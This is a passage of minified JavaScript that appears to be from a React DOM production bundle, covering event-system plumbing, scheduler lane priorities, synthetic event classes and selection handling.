Error(b(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(b(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(b(61))}if(n.style!=null&&typeof n.style!="object")throw Error(b(62))}}function ya(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ka=null;function hl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var wa=null,et=null,nt=null;function pi(e){if(e=is(e)){if(typeof wa!="function")throw Error(b(280));var n=e.stateNode;n&&(n=yr(n),wa(e.stateNode,e.type,n))}}function Yo(e){et?nt?nt.push(e):nt=[e]:et=e}function Ko(){if(et){var e=et,n=nt;if(nt=et=null,pi(e),n)for(e=0;e<n.length;e++)pi(n[e])}}function qo(e,n){return e(n)}function Zo(){}var zr=!1;function Xo(e,n,t){if(zr)return e(n,t);zr=!0;try{return qo(e,n,t)}finally{zr=!1,(et!==null||nt!==null)&&(Zo(),Ko())}}function Ut(e,n){var t=e.stateNode;if(t===null)return null;var s=yr(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(b(231,n,typeof t));return t}var ba=!1;if(Qe)try{var kt={};Object.defineProperty(kt,"passive",{get:function(){ba=!0}}),window.addEventListener("test",kt,kt),window.removeEventListener("test",kt,kt)}catch{ba=!1}function Lp(e,n,t,s,r,a,l,i,o){var u=Array.prototype.slice.call(arguments,3);try{n.apply(t,u)}catch(g){this.onError(g)}}var Ot=!1,Vs=null,Ws=!1,xa=null,Np={onError:function(e){Ot=!0,Vs=e}};function Op(e,n,t,s,r,a,l,i,o){Ot=!1,Vs=null,Lp.apply(Np,arguments)}function Rp(e,n,t,s,r,a,l,i,o){if(Op.apply(this,arguments),Ot){if(Ot){var u=Vs;Ot=!1,Vs=null}else throw Error(b(198));Ws||(Ws=!0,xa=u)}}function zn(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Jo(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function di(e){if(zn(e)!==e)throw Error(b(188))}function Ap(e){var n=e.alternate;if(!n){if(n=zn(e),n===null)throw Error(b(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var a=r.alternate;if(a===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===a.child){for(a=r.child;a;){if(a===t)return di(r),e;if(a===s)return di(r),n;a=a.sibling}throw Error(b(188))}if(t.return!==s.return)t=r,s=a;else{for(var l=!1,i=r.child;i;){if(i===t){l=!0,t=r,s=a;break}if(i===s){l=!0,s=r,t=a;break}i=i.sibling}if(!l){for(i=a.child;i;){if(i===t){l=!0,t=a,s=r;break}if(i===s){l=!0,s=a,t=r;break}i=i.sibling}if(!l)throw Error(b(189))}}if(t.alternate!==s)throw Error(b(190))}if(t.tag!==3)throw Error(b(188));return t.stateNode.current===t?e:n}function ec(e){return e=Ap(e),e!==null?nc(e):null}function nc(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=nc(e);if(n!==null)return n;e=e.sibling}return null}var tc=ke.unstable_scheduleCallback,hi=ke.unstable_cancelCallback,jp=ke.unstable_shouldYield,Mp=ke.unstable_requestPaint,G=ke.unstable_now,Ip=ke.unstable_getCurrentPriorityLevel,fl=ke.unstable_ImmediatePriority,sc=ke.unstable_UserBlockingPriority,$s=ke.unstable_NormalPriority,Dp=ke.unstable_LowPriority,rc=ke.unstable_IdlePriority,fr=null,Be=null;function zp(e){if(Be&&typeof Be.onCommitFiberRoot=="function")try{Be.onCommitFiberRoot(fr,e,void 0,(e.current.flags&128)===128)}catch{}}var Ae=Math.clz32?Math.clz32:Up,Bp=Math.log,Fp=Math.LN2;function Up(e){return e>>>=0,e===0?32:31-(Bp(e)/Fp|0)|0}var vs=64,ys=4194304;function Pt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Gs(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,a=e.pingedLanes,l=t&268435455;if(l!==0){var i=l&~r;i!==0?s=Pt(i):(a&=l,a!==0&&(s=Pt(a)))}else l=t&~r,l!==0?s=Pt(l):a!==0&&(s=Pt(a));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,a=n&-n,r>=a||r===16&&(a&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Ae(n),r=1<<t,s|=e[t],n&=~r;return s}function Hp(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Vp(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,a=e.pendingLanes;0<a;){var l=31-Ae(a),i=1<<l,o=r[l];o===-1?(!(i&t)||i&s)&&(r[l]=Hp(i,n)):o<=n&&(e.expiredLanes|=i),a&=~i}}function Sa(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function ac(){var e=vs;return vs<<=1,!(vs&4194240)&&(vs=64),e}function Br(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function as(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Ae(n),e[n]=t}function Wp(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-Ae(t),a=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~a}}function ml(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Ae(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var M=0;function lc(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var ic,gl,oc,cc,uc,Ea=!1,ks=[],ln=null,on=null,cn=null,Ht=new Map,Vt=new Map,nn=[],$p="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function fi(e,n){switch(e){case"focusin":case"focusout":ln=null;break;case"dragenter":case"dragleave":on=null;break;case"mouseover":case"mouseout":cn=null;break;case"pointerover":case"pointerout":Ht.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Vt.delete(n.pointerId)}}function wt(e,n,t,s,r,a){return e===null||e.nativeEvent!==a?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:a,targetContainers:[r]},n!==null&&(n=is(n),n!==null&&gl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function Gp(e,n,t,s,r){switch(n){case"focusin":return ln=wt(ln,e,n,t,s,r),!0;case"dragenter":return on=wt(on,e,n,t,s,r),!0;case"mouseover":return cn=wt(cn,e,n,t,s,r),!0;case"pointerover":var a=r.pointerId;return Ht.set(a,wt(Ht.get(a)||null,e,n,t,s,r)),!0;case"gotpointercapture":return a=r.pointerId,Vt.set(a,wt(Vt.get(a)||null,e,n,t,s,r)),!0}return!1}function pc(e){var n=Cn(e.target);if(n!==null){var t=zn(n);if(t!==null){if(n=t.tag,n===13){if(n=Jo(t),n!==null){e.blockedOn=n,uc(e.priority,function(){oc(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Rs(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Ta(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);ka=s,t.target.dispatchEvent(s),ka=null}else return n=is(t),n!==null&&gl(n),e.blockedOn=t,!1;n.shift()}return!0}function mi(e,n,t){Rs(e)&&t.delete(n)}function Qp(){Ea=!1,ln!==null&&Rs(ln)&&(ln=null),on!==null&&Rs(on)&&(on=null),cn!==null&&Rs(cn)&&(cn=null),Ht.forEach(mi),Vt.forEach(mi)}function bt(e,n){e.blockedOn===n&&(e.blockedOn=null,Ea||(Ea=!0,ke.unstable_scheduleCallback(ke.unstable_NormalPriority,Qp)))}function Wt(e){function n(r){return bt(r,e)}if(0<ks.length){bt(ks[0],e);for(var t=1;t<ks.length;t++){var s=ks[t];s.blockedOn===e&&(s.blockedOn=null)}}for(ln!==null&&bt(ln,e),on!==null&&bt(on,e),cn!==null&&bt(cn,e),Ht.forEach(n),Vt.forEach(n),t=0;t<nn.length;t++)s=nn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<nn.length&&(t=nn[0],t.blockedOn===null);)pc(t),t.blockedOn===null&&nn.shift()}var tt=Ze.ReactCurrentBatchConfig,Qs=!0;function Yp(e,n,t,s){var r=M,a=tt.transition;tt.transition=null;try{M=1,vl(e,n,t,s)}finally{M=r,tt.transition=a}}function Kp(e,n,t,s){var r=M,a=tt.transition;tt.transition=null;try{M=4,vl(e,n,t,s)}finally{M=r,tt.transition=a}}function vl(e,n,t,s){if(Qs){var r=Ta(e,n,t,s);if(r===null)Kr(e,n,s,Ys,t),fi(e,s);else if(Gp(r,e,n,t,s))s.stopPropagation();else if(fi(e,s),n&4&&-1<$p.indexOf(e)){for(;r!==null;){var a=is(r);if(a!==null&&ic(a),a=Ta(e,n,t,s),a===null&&Kr(e,n,s,Ys,t),a===r)break;r=a}r!==null&&s.stopPropagation()}else Kr(e,n,s,null,t)}}var Ys=null;function Ta(e,n,t,s){if(Ys=null,e=hl(s),e=Cn(e),e!==null)if(n=zn(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Jo(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Ys=e,null}function dc(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Ip()){case fl:return 1;case sc:return 4;case $s:case Dp:return 16;case rc:return 536870912;default:return 16}default:return 16}}var sn=null,yl=null,As=null;function hc(){if(As)return As;var e,n=yl,t=n.length,s,r="value"in sn?sn.value:sn.textContent,a=r.length;for(e=0;e<t&&n[e]===r[e];e++);var l=t-e;for(s=1;s<=l&&n[t-s]===r[a-s];s++);return As=r.slice(e,1<s?1-s:void 0)}function js(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function ws(){return!0}function gi(){return!1}function be(e){function n(t,s,r,a,l){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=a,this.target=l,this.currentTarget=null;for(var i in e)e.hasOwnProperty(i)&&(t=e[i],this[i]=t?t(a):a[i]);return this.isDefaultPrevented=(a.defaultPrevented!=null?a.defaultPrevented:a.returnValue===!1)?ws:gi,this.isPropagationStopped=gi,this}return H(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=ws)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=ws)},persist:function(){},isPersistent:ws}),n}var ht={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},kl=be(ht),ls=H({},ht,{view:0,detail:0}),qp=be(ls),Fr,Ur,xt,mr=H({},ls,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:wl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==xt&&(xt&&e.type==="mousemove"?(Fr=e.screenX-xt.screenX,Ur=e.screenY-xt.screenY):Ur=Fr=0,xt=e),Fr)},movementY:function(e){return"movementY"in e?e.movementY:Ur}}),vi=be(mr),Zp=H({},mr,{dataTransfer:0}),Xp=be(Zp),Jp=H({},ls,{relatedTarget:0}),Hr=be(Jp),ed=H({},ht,{animationName:0,elapsedTime:0,pseudoElement:0}),nd=be(ed),td=H({},ht,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),sd=be(td),rd=H({},ht,{data:0}),yi=be(rd),ad={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},ld={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},id={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function od(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=id[e])?!!n[e]:!1}function wl(){return od}var cd=H({},ls,{key:function(e){if(e.key){var n=ad[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=js(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?ld[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:wl,charCode:function(e){return e.type==="keypress"?js(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?js(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),ud=be(cd),pd=H({},mr,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ki=be(pd),dd=H({},ls,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:wl}),hd=be(dd),fd=H({},ht,{propertyName:0,elapsedTime:0,pseudoElement:0}),md=be(fd),gd=H({},mr,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),vd=be(gd),yd=[9,13,27,32],bl=Qe&&"CompositionEvent"in window,Rt=null;Qe&&"documentMode"in document&&(Rt=document.documentMode);var kd=Qe&&"TextEvent"in window&&!Rt,fc=Qe&&(!bl||Rt&&8<Rt&&11>=Rt),wi=" ",bi=!1;function mc(e,n){switch(e){case"keyup":return yd.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function gc(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Vn=!1;function wd(e,n){switch(e){case"compositionend":return gc(n);case"keypress":return n.which!==32?null:(bi=!0,wi);case"textInput":return e=n.data,e===wi&&bi?null:e;default:return null}}function bd(e,n){if(Vn)return e==="compositionend"||!bl&&mc(e,n)?(e=hc(),As=yl=sn=null,Vn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return fc&&n.locale!=="ko"?null:n.data;default:return null}}var xd={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function xi(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!xd[e.type]:n==="textarea"}function vc(e,n,t,s){Yo(s),n=Ks(n,"onChange"),0<n.length&&(t=new kl("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var At=null,$t=null;function Sd(e){Pc(e,0)}function gr(e){var n=Gn(e);if(Uo(n))return e}function Ed(e,n){if(e==="change")return n}var yc=!1;if(Qe){var Vr;if(Qe){var Wr="oninput"in document;if(!Wr){var Si=document.createElement("div");Si.setAttribute("oninput","return;"),Wr=typeof Si.oninput=="function"}Vr=Wr}else Vr=!1;yc=Vr&&(!document.documentMode||9<document.documentMode)}function Ei(){At&&(At.detachEvent("onpropertychange",kc),$t=At=null)}function kc(e){if(e.propertyName==="value"&&gr($t)){var n=[];vc(n,$t,e,hl(e)),Xo(Sd,n)}}function Td(e,n,t){e==="focusin"?(Ei(),At=n,$t=t,At.attachEvent("onpropertychange",kc)):e==="focusout"&&Ei()}function _d(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return gr($t)}function Cd(e,n){if(e==="click")return gr(n)}function Pd(e,n){if(e==="input"||e==="change")return gr(n)}function Ld(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Me=typeof Object.is=="function"?Object.is:Ld;function Gt(e,n){if(Me(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!ia.call(n,r)||!Me(e[r],n[r]))return!1}return!0}function Ti(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function _i(e,n){var t=Ti(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Ti(t)}}function wc(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?wc(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function bc(){for(var e=window,n=Hs();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Hs(e.document)}return n}function xl(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Nd(e){var n=bc(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&wc(t.ownerDocument.documentElement,t)){if(s!==null&&xl(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,a=Math.min(s.start,r);s=s.end===void 0?a:Math.min(s.end,r),!e.extend&&a>s&&(r=s,s=a,a=r),r=_i(t,a);var l=_i(t,s);r&&l&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==l.node||e.focusOffset!==l.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),a>s?(e.addRange(n),e.extend(l.node,l.offset)):(n.setEnd(l.node,l.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Od=Qe&&"documentMode"in document&&11>=document.documentMode,Wn=null,_a=null,jt=null,Ca=!1;function Ci(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Ca||Wn==null||Wn!==Hs(s)||(s=Wn,"selectionStart"in s&&xl(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),jt&&Gt(jt,s)||(jt=s,s=Ks(_a,"onSelect"),0<s.length&&(n=new kl("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=Wn)))}function bs(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var $n={animationend:bs("Animation","AnimationEnd"),animationiteration:bs("Animation","AnimationIteration"),animationstart:bs("Animation","AnimationStart"),transitionend:bs("Transition","TransitionEnd")},$r={},xc={};Qe&&(xc=document.createElement("div").style,"AnimationEvent"in window||(delete $n.animationend.animation,delete $n.animationiteration.animation,delete $n.animationstart.animation),"TransitionEvent"in window||delete $n.transitionend.transition);function vr(e){if($r[e])return $r[e];if(!$n[e])return e;var n=$n[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in xc)return $r[e]=n[t];return e}var Sc=vr("animationend"),Ec=vr("animationiteration"),Tc=vr("animationstart"),_c=vr("transitionend"),Cc=new Map,Pi="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function yn(e,n){Cc.set(e,n),Dn(n,[e])}for(var Gr=0;Gr<Pi.length;Gr++){var Qr=Pi[Gr],Rd=Qr.toLowerCase(),Ad=Qr[0].toUpperCase()+Qr.slice(1);yn(Rd,"on"+Ad)}yn(Sc,"onAnimationEnd");yn(Ec,"onAnimationIteration");yn(Tc,"onAnimationStart");yn("dblclick","onDoubleClick");yn("focusin","onFocus");yn("focusout","onBlur");yn(_c,"onTransitionEnd");at("onMouseEnter",["mouseout","mouseover"]);at("onMouseLeave",["mouseout","mouseover"]);at("onPointerEnter",["pointerout","pointerover"]);at("onPointerLeave",["pointerout","pointerover"]);Dn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Dn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Dn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Dn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Dn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Dn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Lt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),jd=new Set("cancel close invalid load scroll toggle".split(" ").concat(Lt));function Li(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Rp(s,n,void 0,e),e.currentTarget=null}function Pc(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var a=void 0;if(n)for(var l=s.length-1;0<=l;l--){var i=s[l],o=i.instance,u=i.currentTarget;if(i=i.listener,o!==a&&r.isPropagationStopped())break e;Li(r,i,u),a=o}else for(l=0;l<s.length;l++){if(i=s[l],o=i.instance,u=i.currentTarget,i=i.listener,o!==a&&r.isPropagationStopped())break e;Li(r,i,u),a=o}}}if(Ws)throw e=xa,Ws=!1,xa=null,e}function D(e,n){var t=n[Ra];t===void 0&&(t=n[Ra]=new Set);var s=e+"__bubble";t.has(s)||(Lc(n,e,2,!1),t.add(s))}function Yr(e,n,t){var s=0;n&&(s|=4),Lc(t,e,s,n)}var xs="_reactListening"+Math.random().toString(36).slice(2);function Qt(e){if(!e[xs]){e[xs]=!0,Io.forEach(function(t){t!=="selectionchange"&&(jd.has(t)||Yr(t,!1,e),Yr(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[xs]||(n[xs]=!0,Yr("selectionchange",!1,n))}}function Lc(e,n,t,s){switch(dc(n)){case 1:var r=Yp;break;case 4:r=Kp;break;default:r=vl}t=r.bind(null,n,t,e),r=void 0,!ba||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Kr(e,n,t,s,r){var a=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var l=s.tag;if(l===3||l===4){var i=s.stateNode.containerInfo;if(i===r||i.nodeType===8&&i.parentNode===r)break;if(l===4)for(l=s.return;l!==null;){var o=l.tag;if((o===3||o===4)&&(o=l.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;l=l.return}for(;i!==null;){if(l=Cn(i),l===null)return;if(o=l.tag,o===5||o===6){s=a=l;continue e}i=i.parentNode}}s=s.return}Xo(function(){var u=a,g=hl(t),f=[];e:{var m=Cc.get(e);if(m!==void 0){var v=kl,k=e;switch(e){case"keypress":if(js(t)===0)break e;case"keydown":case"keyup":v=ud;break;case"focusin":k="focus",v=Hr;break;case"focusout":k="blur",v=Hr;break;case"beforeblur":case"afterblur":v=Hr;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=vi;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=Xp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=hd;break;case Sc:case Ec:case Tc:v=nd;break;case _c:v=md;break;case"scroll":v=qp;break;case"wheel":v=vd;break;case"copy":case"cut":case"paste":v=sd;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=ki}var w=(n&4)!==0,E=!w&&e==="scroll",d=w?m!==null?m+"Capture":null:m;w=[];for(var p=u,h;p!==null;){h=p;var y=h.stateNode;if(h.tag===5&&y!==null&&(h=y,d!==null&&(y=Ut(p,d),y!=null&&w.push(Yt(p,y,h)))),E)break;p=p.return}0<w.length&&(m=new v(m,k,null,t,g),f.push({event:m,listeners:w}))}}if(!(n&7)){e:{if(m=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",m&&t!==ka&&(k=t.relatedTarget||t.fromElement)&&(Cn(k)||k[Ye]))break 